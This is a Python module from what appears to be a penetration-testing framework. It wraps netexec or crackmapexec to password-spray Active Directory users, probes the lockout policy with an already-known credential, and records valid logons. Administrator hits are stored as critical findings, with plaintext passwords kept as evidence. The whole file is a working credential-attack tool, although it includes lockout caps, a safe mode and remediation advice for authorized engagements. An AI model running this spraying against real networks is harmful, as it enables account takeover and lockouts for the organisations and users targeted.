"""Password spraying via ``netexec`` (preferred) or ``crackmapexec``.

Spraying is **active and lockout-prone**: every failed authentication
counts against the target account's `badPwdCount`. The wrapper enforces
two levels of protection:

1. **Hard cap** on the number of distinct passwords sprayed against
   any single user. The cap is derived from the configured lockout
   threshold (``threshold - safety_margin``). The default safety
   margin (2) leaves the operator headroom even if the account had
   previous bad logons during the engagement.
2. **Domain policy probe** (best effort): when a credential is
   already known, the wrapper queries the DC's password policy via
   ``netexec`` and tightens the cap automatically. Manual config
   always wins over the probe.

Successful logons land in :class:`Credential` (with ``source="spray"``),
admin-flagged sessions raise a high-severity Finding.

Safe mode strictly disables this wrapper: spraying is the canonical
example of an action that crosses the line between enumeration and
exploitation.
"""

from __future__ import annotations

import re
import shutil
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

from core.logger import get_logger
from core.target_manager import Credential, Finding, TargetManager


# nxc / cme success line - examples:
#   SMB  192.168.56.10  445  DC01  [+] sevenkingdoms.local\jon.snow:Pwd1!
#   SMB  192.168.56.10  445  DC01  [+] sevenkingdoms.local\admin:Pwd1! (Pwn3d!)
_RE_SUCCESS = re.compile(
    r"\[\+\]\s+(?P<domain>[^\\\s]+)\\(?P<user>[^:\s]+):(?P<password>\S+?)"
    r"(?:\s+\((?P<flag>[^)]+)\))?\s*$",
    re.MULTILINE,
)
# Lockout-policy probe output - netexec prints these lines for ``--pass-pol``.
_RE_LOCKOUT_THRESHOLD = re.compile(
    r"Account Lockout Threshold:\s+(?P<n>\d+)", re.IGNORECASE
)


@dataclass
class SprayResult:
    status: str                                       # completed / skipped / error
    targets: list[str] = field(default_factory=list)
    attempts: int = 0
    capped_passwords: int = 0
    valid: list[dict] = field(default_factory=list)   # {domain,user,password,flag}
    stdout: str = ""
    stderr: str = ""


class PasswordSprayer:
    """One-shot password sprayer with lockout protection."""

    DEFAULT_TIMEOUT = 300
    DEFAULT_LOCKOUT_THRESHOLD = 5
    DEFAULT_SAFETY_MARGIN = 2

    def __init__(
        self,
        tm: TargetManager,
        domain: str,
        targets: list[str],
        passwords: list[str],
        users: list[str] | None = None,
        protocol: str = "smb",
        binary: str | None = None,
        lockout_threshold: int | None = None,
        safety_margin: int = DEFAULT_SAFETY_MARGIN,
        probe_password_policy: bool = True,
        timeout: int = DEFAULT_TIMEOUT,
        loot_dir: str | Path = "./loot",
        safe_mode: bool = False,
        stealth_mode: bool = False,
    ):
        self.tm = tm
        self.domain = domain
        self.targets = list(targets)
        self.passwords = list(passwords)
        # Users default to whatever recon discovered.
        self.users = list(users) if users is not None else sorted(tm.users)
        self.protocol = protocol
        # Scope the materialised user list to the engagement workspace so it
        # never leaks into the shared ``./loot`` root (which may be owned by a
        # previous sudo run and non-writable).
        self.loot_dir = Path(loot_dir)
        # Prefer netexec (the maintained fork); fall back to nxc / cme.
        self.binary = (
            binary
            or shutil.which("netexec")
            or shutil.which("nxc")
            or shutil.which("crackmapexec")
            or "nxc"
        )
        self.lockout_threshold = lockout_threshold
        self.safety_margin = max(1, safety_margin)
        self.probe_password_policy = probe_password_policy
        self.timeout = timeout
        self.safe_mode = safe_mode
        self.stealth_mode = stealth_mode
        self.log = get_logger()

    # ------------------------------------------------------------------
    # Preconditions
    # ------------------------------------------------------------------

    def check_prerequisites(self) -> tuple[bool, str]:
        # Spraying is active by definition - safe mode bans it outright.
        if self.safe_mode:
            return False, (
                "safe mode enabled - password spraying is active and "
                "strictly disabled"
            )
        if not self.targets:
            return False, "no spray targets supplied"
        if not self.users:
            return False, (
                "no users to spray - run Phase 1 user_enum first or "
                "supply users explicitly"
            )
        if not self.passwords:
            return False, "no passwords supplied"
        if not (
            Path(self.binary).is_file()
            or shutil.which(self.binary) is not None
        ):
            return False, f"netexec/nxc binary not found: {self.binary}"
        return True, ""

    # ------------------------------------------------------------------
    # Lockout-aware throttling
    # ------------------------------------------------------------------

    def effective_cap(self) -> int:
        """Maximum number of passwords we will spray per user."""
        threshold = (
            self.lockout_threshold
            if self.lockout_threshold is not None
            else self.DEFAULT_LOCKOUT_THRESHOLD
        )
        # ``threshold == 0`` in AD policy means no lockout - still keep
        # a sane floor to limit log noise.
        if threshold == 0:
            return max(1, len(self.passwords))
        return max(1, threshold - self.safety_margin)

    def probe_lockout_threshold(self) -> int | None:
        """Best-effort policy probe via ``netexec ... --pass-pol``.

        Requires a known credential (we re-use the first one stored in
        the TargetManager). Returns ``None`` when the probe cannot be
        performed or parsed; the caller falls back to the configured
        default.
        """
        if not self.probe_password_policy:
            return None
        # ``has_auth_secret`` skips credentials whose only ``nt_hash`` is a
        # stashed ``$krb5*`` roast blob - those cannot bind for a policy probe.
        cred = next(
            (c for c in self.tm.credentials if c.has_auth_secret),
            None,
        )
        if cred is None:
            return None
        target = self.targets[0]
        cmd = [self.binary, self.protocol, target, "-u", cred.username]
        if cred.password:
            cmd.extend(["-p", cred.password])
        elif cred.real_nt_hash:
            cmd.extend(["-H", cred.real_nt_hash])
        if cred.domain:
            cmd.extend(["-d", cred.domain])
        cmd.append("--pass-pol")
        self.tm.record_activity(
            "password-policy", target, phase="Phase 3 - Credential Harvesting",
            details="lockout threshold probe before spraying (nxc --pass-pol)",
        )
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True,
                timeout=60,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            self.log.debug(f"password-policy probe failed: {exc}")
            return None
        m = _RE_LOCKOUT_THRESHOLD.search(proc.stdout + proc.stderr)
        if not m:
            return None
        return int(m.group("n"))

    # ------------------------------------------------------------------
    # Command builder
    # ------------------------------------------------------------------

    def build_command(self, target: str, password: str) -> list[str]:
        """Build the per-(target,password) spray command.

        We use one ``-u <userlist>`` against ``-p <password>`` so each
        password is tried once per user - `bad_password_count` advances
        by exactly one per round.
        """
        # ``--continue-on-success`` keeps trying even after a hit so we
        # see all valid (user,password) tuples. ``--no-bruteforce`` is
        # the netexec spelling that pairs each user with the single
        # password rather than crossing the lists.
        userlist_path = self._materialise_userlist()
        cmd: list[str] = [
            self.binary,
            self.protocol,
            target,
            "-u", str(userlist_path),
            "-p", password,
            "--continue-on-success",
            "--no-bruteforce",
        ]
        if self.domain:
            cmd.extend(["-d", self.domain])
        return cmd

    def _materialise_userlist(self) -> Path:
        # Write into the engagement's loot directory, not a hardcoded ``./loot``
        # relative to the CWD: the latter ignored the configured workspace and
        # broke whenever ``./loot`` was owned by another user (e.g. left
        # root-owned by a prior privileged run).
        path = self.loot_dir / "spray_users.txt"
        try:
            self.loot_dir.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self.log.warn(f"Could not create loot dir: {exc}")
        path.write_text("\n".join(self.users) + "\n", encoding="utf-8")
        return path

    # ------------------------------------------------------------------
    # Output parsing
    # ------------------------------------------------------------------

    def _parse_success_lines(self, blob: str) -> list[dict]:
        hits: list[dict] = []
        for m in _RE_SUCCESS.finditer(blob):
            hits.append(
                {
                    "domain": m.group("domain"),
                    "user": m.group("user"),
                    "password": m.group("password"),
                    "flag": (m.group("flag") or "").strip(),
                }
            )
        return hits

    def _persist(self, hit: dict, target: str) -> None:
        cred = Credential(
            username=hit["user"],
            domain=hit["domain"],
            password=hit["password"],
            source="spray",
            valid_on=[target],
        )
        self.tm.add_credential(cred)
        admin = "Pwn3d" in hit["flag"] or "admin" in hit["flag"].lower()
        self.tm.add_finding(
            Finding(
                id=f"SPRAY-HIT-{hit['user']}",
                title=(
                    f"Password spray hit: {hit['domain']}\\{hit['user']}"
                    + (" (administrator)" if admin else "")
                ),
                severity="critical" if admin else "high",
                host=target,
                description=(
                    f"Account {hit['domain']}\\{hit['user']} authenticated "
                    f"successfully on {target} with a sprayed password."
                ),
                remediation=(
                    "Force a password reset, enforce a strong password "
                    "policy and enable account lockout monitoring."
                ),
                evidence=f"{hit['user']}:{hit['password']}",
            )
        )

    # ------------------------------------------------------------------
    # Orchestration
    # ------------------------------------------------------------------

    def run(self) -> SprayResult:
        ok, reason = self.check_prerequisites()
        if not ok:
            self.log.warn(f"spray skipped: {reason}")
            return SprayResult(status="skipped", stderr=reason)

        # Apply lockout policy: probe first if we have a credential,
        # otherwise honour the configured default.
        probed = self.probe_lockout_threshold()
        if probed is not None:
            if self.lockout_threshold is None:
                self.lockout_threshold = probed
                self.log.info(
                    f"Lockout threshold probed from policy: {probed}"
                )
            else:
                self.log.info(
                    f"Lockout threshold from config ({self.lockout_threshold}) "
                    f"keeps precedence over probed value ({probed})"
                )

        cap = self.effective_cap()
        if self.stealth_mode and cap > 1:
            self.log.info("Stealth mode: limiting spray to 1 password per round")
            cap = 1
        if len(self.passwords) > cap:
            self.log.warn(
                f"Capping spray to {cap} password(s) per user "
                f"(asked for {len(self.passwords)}, lockout threshold "
                f"{self.lockout_threshold or self.DEFAULT_LOCKOUT_THRESHOLD})"
            )
        sprays = self.passwords[:cap]

        all_hits: list[dict] = []
        attempts = 0
        combined_stdout: list[str] = []
        combined_stderr: list[str] = []

        for target in self.targets:
            for password in sprays:
                attempts += 1
                cmd = self.build_command(target, password)
                self.log.action(
                    f"spray {target} pwd={password} users={len(self.users)}"
                )
                self.tm.record_command(
                    cmd, phase="Phase 3 - Credential Harvesting",
                    tool="netexec", target=target,
                )
                # SOC log: one row per spray round against the target. The
                # password itself is never recorded - only that an
                # authentication attempt was made against N accounts.
                self.tm.record_activity(
                    "password-spray", target,
                    phase="Phase 3 - Credential Harvesting",
                    details=f"single-password spray against {len(self.users)} account(s) "
                    "(lockout-aware)",
                )
                try:
                    proc = subprocess.run(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        # Detach stdin: netexec / nxc accept piped input
                        # in some modes and would otherwise try to read
                        # the parent terminal.
                        stdin=subprocess.DEVNULL,
                        text=True,
                        timeout=self.timeout,
                    )
                except FileNotFoundError as exc:
                    self.log.error(f"spray binary missing: {exc}")
                    return SprayResult(
                        status="error",
                        targets=self.targets,
                        attempts=attempts,
                        stderr=str(exc),
                    )
                except subprocess.TimeoutExpired as exc:
                    self.log.warn(
                        f"spray timed out after {self.timeout}s on {target}"
                    )
                    combined_stderr.append(f"timeout on {target}: {exc}")
                    continue

                combined_stdout.append(proc.stdout or "")
                combined_stderr.append(proc.stderr or "")
                hits = self._parse_success_lines(
                    (proc.stdout or "") + "\n" + (proc.stderr or "")
                )
                for hit in hits:
                    self._persist(hit, target)
                all_hits.extend(hits)

        self.log.success(
            f"spray completed: {len(all_hits)} hit(s) over {attempts} attempt(s)"
        )
        return SprayResult(
            status="completed",
            targets=self.targets,
            attempts=attempts,
            capped_passwords=len(sprays),
            valid=all_hits,
            stdout="\n".join(combined_stdout),
            stderr="\n".join(combined_stderr),
        )
